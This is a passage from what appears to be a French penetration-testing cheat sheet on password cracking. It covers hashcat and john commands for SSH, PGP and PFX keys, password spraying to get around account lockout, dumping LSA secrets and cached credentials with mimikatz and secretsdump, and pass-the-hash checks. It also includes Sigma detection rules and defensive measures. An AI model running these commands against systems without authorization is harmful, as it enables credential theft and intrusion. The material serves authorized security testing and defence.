| RAR5 | `rar2john` | `13000` | `rar5` | Lent |
| 7z | `7z2john` | `11600` | `7z` | Variable |
| PDF | `pdf2john` | `10500`-`10700` | `pdf` | Variable |
| Office 2007 | `office2john` | `9400` | `ms-office2007` | Moyen |
| Office 2010 | `office2john` | `9500` | `ms-office2010` | Lent |
| Office 2013 | `office2john` | `9600` | `ms-office2013` | Très lent |
| KeePass 1.x | `keepass2john` | `13400` | `keepass` | Moyen |
| KeePass 2.x | `keepass2john` | `13400` | `keepass` | Lent |
| BitLocker | `bitlocker2john` | `22100` | `bitlocker` | Très lent |
| FileVault 2 | `filevault2john` | — | `filevault2` | Très lent |

---

## 17. Cas d'usage — Certificats & Clés

### 17.1 SSH Key Cracking

```bash
# SSH key (RSA) → john
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt

# SSH key → hashcat
ssh2john id_rsa | cut -d: -f2 > hash.txt
hashcat -m 22 hash.txt rockyou.txt

# SSH key (ED25519)
ssh2john id_ed25519 > hash.txt
hashcat -m 23 hash.txt rockyou.txt
```

### 17.2 SSL/TLS Private Key

```bash
# Extraire le hash d'une clé privée SSL
openssl rsa -in server.key -outform der 2>/dev/null | \
  python3 -c "import sys; print(sys.stdin.buffer.read().hex())"

# ou avec john
pem2john server.key > hash.txt
john --wordlist=rockyou.txt hash.txt
```

### 17.3 PKCS12 (.pfx / .p12)

```bash
# Extraire le hash
pfx2john certificate.pfx > hash.txt
john --wordlist=rockyou.txt hash.txt

# hashcat (PKCS#12 v1/v3)
hashcat -m 24300 hash.txt rockyou.txt  # PKCS12
```

### 17.4 GPG/PGP

```bash
# GPG private key
gpg2john private.key > hash.txt
john --wordlist=rockyou.txt hash.txt

# hashcat
gpg2john private.key | cut -d: -f2 > hash.txt
hashcat -m 17000 hash.txt rockyou.txt  # GPG (AES-128)
hashcat -m 17001 hash.txt rockyou.txt  # GPG (AES-192)
hashcat -m 17002 hash.txt rockyou.txt  # GPG (AES-256)
```

### 17.5 RSA Factorization

```bash
# Si le module RSA est petit (< 512 bits), on peut le factoriser
# Outil : RsaCtfTool ou factordb.com

# Vérifier sur factordb.com
# Si le facteur est déjà connu → calculer la clé privée

# Avec RsaCtfTool
python3 RsaCtfTool.py --publickey public.pem --private
```

---

## 18. Bypass des protections

### 18.1 Account Lockout Bypass

```bash
# Stratégie 1 : Password Spray (1 mdp, tous les users)
nxc smb 10.10.10.0/24 -u users.txt -p 'Fall2024!' --no-bruteforce

# Stratégie 2 : Timing (attendre le reset de lockout)
# Si lockout = 5 tentatives / 30 min → 1 spray / 30 min

# Stratégie 3 : Utiliser des comptes de service
# Les comptes de service ont souvent des politiques différentes

# Stratégie 4 : Kerberos (AS-REP / Kerberoast)
# Pas de lockout sur Kerberoast (pas d'authentification)

# Stratégie 5 : Cached credentials (DCC)
# Même avec lockout, les DCC sont accessibles via dump
```

### 18.2 Password Filter Enumeration

```bash
# Les password filters Windows vérifient les politiques de mots de passe
# On peut les énumérer
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"

# Si on trouve un filter custom, on peut analyser ses règles
# pour comprendre la politique de mots de passe
```

### 18.3 Cached Credentials (DCC)

```bash
# Les DCC (Domain Cached Credentials) stockent des hash MD4 du mdp
# même quand le DC est indisponible
hashcat -m 2100 dcc_hash.txt rockyou.txt

# Dump depuis la base SAM locale
# Le DCC est stocké dans : HKLM\SECURITY\Cache
impacket-secretsdump -security SECURITY.bak -system SYSTEM.bak LOCAL
```

### 18.4 LSA Secrets

```bash
# LSA Secrets contiennent des mots de passe en clair
# pour les services, tâches planifiées, etc.
mimikatz # lsadump::secrets

# Avec Impacket
impacket-secretsdump -security SECURITY.bak -system SYSTEM.bak LOCAL

# Ces mots de passe sont souvent réutilisés pour les comptes service
```

---

## 19. Scripts & Automatisation

### 19.1 Détection automatique de hash (Python)

```python
#!/usr/bin/env python3
"""hash_detect.py — Détecte et catégorise automatiquement les hashes"""

import re
import sys

HASH_PATTERNS = {
    'MD5':         (r'^[a-f0-9]{32}$', 'hashcat -m 0', 'raw-md5'),
    'SHA-1':       (r'^[a-f0-9]{40}$', 'hashcat -m 100', 'raw-sha1'),
    'SHA-256':     (r'^[a-f0-9]{64}$', 'hashcat -m 1400', 'raw-sha256'),
    'NTLM':        (r'^[a-f0-9]{32}$', 'hashcat -m 1000', 'nt'),
    'bcrypt':      (r'^\$2[aby]?\$\d{2}\$', 'hashcat -m 3200', 'bcrypt'),
    'Kerberoast':  (r'^\$krb5tgs\$23\$', 'hashcat -m 13100', 'krb5tgs'),
    'AS-REP':      (r'^\$krb5asrep\$23\$', 'hashcat -m 18200', 'krb5asrep'),
    'NetNTLMv2':   (r'^[^:]+::[^:]+:[a-f0-9]{16}:', 'hashcat -m 5600', 'netntlmv2'),
    'WPA':         (r'^WPA\*', 'hashcat -m 22000', 'wpapcap'),
    'JWT':         (r'^eyJ[A-Za-z0-9_-]+\.eyJ', 'hashcat -m 16500', 'jwt'),
    'MD5-crypt':   (r'^\$1\$', 'hashcat -m 500', 'md5crypt'),
    'SHA-256-crypt': (r'^\$5\$', 'hashcat -m 7400', 'sha256crypt'),
    'SHA-512-crypt': (r'^\$6\$', 'hashcat -m 1800', 'sha512crypt'),
    'Drupal7':     (r'^\$S\$', 'hashcat -m 7900', 'drupal7'),
    'WordPress':   (r'^P\$', 'hashcat -m 400', 'phpass'),
}

def detect(h):
    for name, (pattern, hc, john) in HASH_PATTERNS.items():
        if re.match(pattern, h.strip()):
            return name, hc, john
    return 'UNKNOWN', 'N/A', 'N/A'

if __name__ == '__main__':
    with open(sys.argv[1]) as f:
        for line in f:
            h = line.strip()
            if not h:
                continue
            name, hc, john = detect(h)
            print(f"[{name}] {h[:50]}...")
            print(f"  hashcat : {hc}")
            print(f"  john    : --format={john}")
```

### 19.2 Workflow hashcat automatisé

```bash
#!/bin/bash
# auto_crack.sh — Workflow automatisé de cracking

HASH_FILE=$1
WORDLIST=${2:-/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt}
RULES="/usr/share/hashcat/rules/best64.rule"

echo "[*] Étape 1 : Détection du hash..."
head -1 "$HASH_FILE" | hashid -m

echo "[*] Étape 2 : Dict straight (rockyou)..."
hashcat -m 1000 -a 0 "$HASH_FILE" "$WORDLIST" --show > found_1.txt

echo "[*] Étape 3 : Dict + règles..."
hashcat -m 1000 -a 0 "$HASH_FILE" "$WORDLIST" -r "$RULES" --show > found_2.txt

echo "[*] Étape 4 : Résultats combinés..."
cat found_1.txt found_2.txt | sort -u > cracked.txt
echo "[+] Hash craqués : $(wc -l < cracked.txt)"
cat cracked.txt
```

### 19.3 Batch cracking avec reporting

```python
#!/usr/bin/env python3
"""batch_crack.py — Cracker plusieurs fichiers de hashes"""

import subprocess
import json
from datetime import datetime

def crack_hashcat(hash_file, hash_type, wordlist, rules=None):
    cmd = ['hashcat', '-m', str(hash_type), '-a', '0', hash_file, wordlist]
    if rules:
        cmd.extend(['-r', rules])
    cmd.append('--show')

    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout.strip().split('\n') if result.stdout.strip() else []

def generate_report(results):
    report = {
        'timestamp': datetime.now().isoformat(),
        'total_hashes': len(results),
        'cracked': sum(1 for r in results if r.get('cracked')),
        'results': results
    }
    with open('crack_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    print(f"[+] Rapport : {report['cracked']}/{report['total_hashes']} craqués")
```

---

## 20. MITRE ATT&CK

> Technique MITRE ATT&CK : T1110 Brute Force

### 20.1 Techniques liées au password cracking

| Technique ID | Nom | Description | Outils |
|---|---|---|---|
| **T1110** | Brute Force | Attaque de force brute | hydra, Medusa, ncrack |
| **T1110.001** | Password Guessing | Deviner le mot de passe (online) | hydra, nxc |
| **T1110.002** | Password Cracking | Casser le hash (offline) | hashcat, john |
| **T1110.003** | Password Spraying | 1 mdp, beaucoup de users | hydra, nxc, Patator |
| **T1110.004** | Credential Stuffing | Utiliser des credentials fuités | Burp, hydra |
| **T1003** | OS Credential Dumping | Extraire les hashes du système | Mimikatz, secretsdump |
| **T1003.001** | LSASS Memory | Dump de la mémoire LSASS | Mimikatz, procdump |
| **T1003.002** | SAM | Extraction du SAM | reg save, mimikatz |
| **T1003.003** | NTDS | Extraction du NTDS.dit | DCSync, secretsdump |
| **T1003.006** | DCSync | Réplication AD pour extraire hashes | Mimikatz, secretsdump |
| **T1558** | Steal/Forge Kerberos Tickets | Kerberoasting, Golden Ticket | Rubeus, Impacket |

### 20.2 Corrélation avec les logs

```mermaid
flowchart TD
    A["T1110.002\nPassword Cracking"] --> B["hashcat.exe dans les logs processus"]
    A --> C["john.exe dans les logs processus"]
    D["T1003.006\nDCSync"] --> E["Event ID 4662\n(Réplication DRS)"]
    D --> F["Mimikatz dans les logs processus"]
    G["T1110.003\nPassword Spraying"] --> H["Beaucoup d'Event ID 4625\n(failed login)"]
    G --> I["Event ID 4771/4776\n(Kerberos/NTLM failures)"]
    style B fill:#f44336,color:#fff
    style E fill:#f44336,color:#fff
    style H fill:#f44336,color:#fff
```

---

## 21. Détection & Défense

### 21.1 Mesures de protection

| Mesure | Priorité | Efficacité | Implémentation |
|---|---|---|---|
| **MFA** | Critique | Bloque 99.9% des attaques | Azure AD, Duo, TOTP |
| **Password Policy** | Haute | Réduit l'espace de recherche | 12+ caractères, complexité |
| **Account Lockout** | Haute | Ralentit les attaques online | 5 tentatives / 30 min |
| **Credential Guard** | Moyenne | Protège les hashes en mémoire | VBS, LSA protection |
| **Monitoring** | Moyenne | Détection précoce | SIEM, Sigma rules |
| **LAPS** | Moyenne | MDP locaux uniques par machine | Password rotation |
| **GMSA** | Moyenne | MDP de service automatiques | Rotation automatique |

### 21.2 Sigma Rules — Détection des outils de cracking

```yaml
# sigma_hashcat_execution.yml
title: Hashcat Execution
id: 12345678-1234-1234-1234-123456789012
status: experimental
description: Détection de l'exécution de hashcat
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\hashcat.exe'
            - '\hashcat64.exe'
            - '\hashcat32.exe'
    condition: selection
level: high
tags:
    - attack.t1110.002
    - attack.credential_access
```

```yaml
# sigma_john_execution.yml
title: John the Ripper Execution
id: 87654321-4321-4321-4321-210987654321
status: experimental
description: Détection de l'exécution de John the Ripper
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\john.exe'
            - '\john64.exe'
    condition: selection
level: high
tags:
    - attack.t1110.002
    - attack.credential_access
```

### 21.3 Monitoring Active Directory

```bash
# Événements critiques à monitorer
# Event ID 4625 : Failed logon
# Event ID 4771 : Kerberos pre-auth failed
# Event ID 4776 : NTLM authentication failed
# Event ID 4648 : Explicit credentials logon
# Event ID 4662 : Object access (DCSync)
# Event ID 4768 : Kerberos TGT request
# Event ID 4769 : Kerberos service ticket request

# PowerShell — Compter les failed logons par IP
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} |
  Select-Object -First 1000 |
  Group-Object @{N='IP';E={$_.Properties[19].Value}} |
  Sort-Object Count -Descending
```

### 21.4 Défense contre le Kerberoast

```
1. Comptes de service avec mots de passe complexes (25+ car.)
2. Group Managed Service Accounts (gMSA)
3. Désactiver les comptes de service inutiles
4. Monitoring des ticket TGS (Event ID 4769 avec encryption type 0x17)
5. AES uniquement (désactiver RC4)
```

---

## 22. Performance & Benchmarks

### 22.1 Estimation du temps de cracking

```python
def estimate_time(hash_count, speed_per_sec, candidates):
    """Estime le temps de cracking en secondes"""
    seconds = candidates / speed_per_sec
    hours = seconds / 3600
    days = hours / 24
    return {
        'candidates': candidates,
        'speed': f'{speed_per_sec:,.0f} H/s',
        'seconds': f'{seconds:,.0f}',
        'hours': f'{hours:.1f}',
        'days': f'{days:.1f}'
    }

# Exemples avec RTX 4090
print("NTLM, 8 lowercase :")
print(estimate_time(1, 214e9, 26**8))
# → 208 milliards de candidats / 214 GH/s = ~16 minutes

print("bcrypt, 8 lowercase :")
print(estimate_time(1, 700e3, 26**8))
# → 208 milliards / 700 kH/s = ~3.4 jours
```

### 22.2 Tableau de référence temps de cracking (RTX 4090)

| Mot de passe | Espace de recherche | MD5 | NTLM | SHA-256 | bcrypt |
|---|---|---|---|---|---|
| 6 lowercase | 308M | <1s | <1s | <1s | ~7 min |
| 8 lowercase | 208B | ~16 min | ~16 min | ~1.2h | ~3.4 jours |
| 8 lowercase+digits | 218B | ~17 min | ~17 min | ~1.2h | ~3.5 jours |
| 10 lowercase | 141T | ~11h | ~11h | ~3.3 jours | ~6.5 ans |
| 10 mixed (upper+lower+digits) | 839T | ~2.7 jours | ~2.7 jours | ~19 jours | ~39 ans |
| 12 mixed+symbols | 4.7P | ~422 jours | ~422 jours | ~3 ans | ~214 ans |
| 8 random ASCII | 6.1Q | ~903 jours | ~903 jours | ~29 ans | ~278 ans |

### 22.3 Comparaison Hardware

| GPU | Prix | NTLM (GH/s) | Ratio perf/prix | Consommation |
|---|---|---|---|---|
| GTX 1080 Ti | ~300€ | 60 | 200 | 250W |
| RTX 3060 | ~350€ | 28 | 80 | 170W |
| RTX 3080 | ~700€ | 110 | 157 | 320W |
| RTX 3090 | ~1500€ | 120 | 80 | 350W |
| RTX 4070 Ti | ~800€ | 80 | 100 | 285W |
| RTX 4080 | ~1100€ | 145 | 132 | 320W |
| RTX 4090 | ~1800€ | 214 | 119 | 450W |
| RX 7900 XTX | ~1000€ | 75 | 75 | 355W |
| AMD MI250X | ~15000€ | 350+ | 23 | 560W |

> [!tip] Le meilleur ratio perf/prix pour le cracking est souvent le **RTX 3080** ou **RTX 4070 Ti**. Le RTX 4090 est le plus rapide mais plus cher.

---

## 23. Tips & Pièges

> [!tip] **Ne pas tout re-lancer : le potfile**
> ```bash
> # Hashcat garde les résultats trouvés dans ~/.hashcat/hashcat.potfile
> hashcat -m 1000 -a 0 hash.txt rockyou.txt --show     # afficher les trouvés
> # Si tu supprimes un hash du potfile, hashcat va le re-tester.
> # Utilise --remove pour retirer les hash craqués du fichier (à la fin).
> ```

> [!tip] **Penser à la VICTIME, pas au hash**
> - **Année + Saison** : `Summer2024`, `Winter!23` → les masques/règles suivent.
> - **Marque / société** : le mdp inclut souvent le nom de la boîte.
> - **Politique** : `Majuscule + min + chiffre + symbole` → `Passw0rd!` (une structure très courante).
> - Un `CUPP`/`CEWL` sur la cible bat 95% des wordlists génériques.

> [!tip] **Cracker en parallèle (plusieurs GPU)**
> ```bash
> # Vérifier les devices dispo
> hashcat -I
> # Forcer le GPU
> hashcat -m 1000 -a 0 hash.txt rockyou.txt --opencl-device-types 2
> # En cas de GPU bloqué/blacklist : -d 1 --force
> ```

> [!tip] **Ne pas toujours cracker : REJOUER**
> NTLM/NetNTLMv2 → tu peux souvent **passer le hash directement** (PtH) sans le casser.
> Le cracking sert à :
> 1. retrouver le **mot de passe en clair** (réutilisation ailleurs)
> 2. se connecter sur d'autres protocoles (SSH, WinRM) qui exigent le clair.
> ```bash
> # Vérifier le hash ailleurs AVANT de cracker :
> nxc winrm 10.10.10.10 -u user -H <hash>
> ```

> [!warning] **Piège n°1 : les formats "à rallonge" (WPA, Argon2, bcrypt)**
> Chaque itération de hash coûte du temps : WPA2 (22000) est lent, Argon2/bcrypt très lent.
> Priorise :
> - **MD5 (0), NTLM (1000), NetNTLMv2 (5600)** → rapides
> - **Kerberoast/AS-REP** → moyens
> - **WPA, bcrypt, Argon2** → seulement si la cible est précise (pas de "rockyou" en boucle).

> [!warning] **Piège n°2 : online = lentes et limitées**
> - SSH/RDP avec des wordlists géantes = lockout + temps infini.
> - Toujours `-f` (stop au premier succès), `-t` (threads) modérés, `-W` (délai).
> - Password Spray : 1 mot de passe, beaucoup d'utilisateurs, jamais de brute-force mono-compte.

> [!warning] **Piège n°3 : RDP = trop rapide = crash de session**
> RDP limite les tentatives et gèle les sessions : **ne lance jamais rockyou entier dessus**.
> Teste d'abord `--time-out` et seulement les mots probables (top 100-1000).

> [!warning] **Piège n°4 : hashcat vs john — ne pas mélanger les formats**
> Les formats john et hashcat ne sont pas toujours compatibles. Utilise les bons outils de conversion.

> [!warning] **Piège n°5 : les hash NTLM sont identiques pour le même mdp**
> NTLM = MD4(password) — pas de salt. Si deux users ont le même hash, ils ont le même mdp.

> [!success] **L'ordre qui marche le plus souvent**
> 1. `rockyou.txt` en clair (mode 0)
> 2. `rockyou + best64.rule`
> 3. Wordlist **générée sur la cible** (CEWL/CUPP) + règles
> 4. Masque intelligent si le format est connu (ex : `?u?l?l?l?l?l?d?d?d?d` pour `Mdp2024`)
> 5. Rejouer le hash partout avant de continuer à cracker.

> [!success] **Checklist de cracking complète**
> 1. Identifier le hash (hashid, nth)
> 2. Vérifier dans les DB de fuites (CrackStation, hashes.com)
> 3. Dict straight (rockyou.txt)
> 4. Dict + règles (best64, OneRuleToRuleThemAll)
> 5. Wordlist ciblée (CeWL, CUPP)
> 6. Masques intelligents (si pattern connu)
> 7. Hybrid (wordlist + mask)
> 8. PRINCE
> 9. Brute-force pur (dernier recours)
> 10. Pass-the-Hash si applicable (NTLM/NetNTLMv2)

---

> [!success] **Le flow de pensée cracking**
> 1. **Identifier** le hash (hashid)
> 2. **Essayer** la dict en clair (rockyou + best64)
> 3. **Générer** une wordlist ciblée (CEWL/CUPP sur la cible)
> 4. **Masques** si le format du mdp est connu
> 5. **Règles** sur la base si on a une piste (année, marque...)

> [!warning] **Rappel** : crackers uniquement sur des hashes que tu as le droit de tester.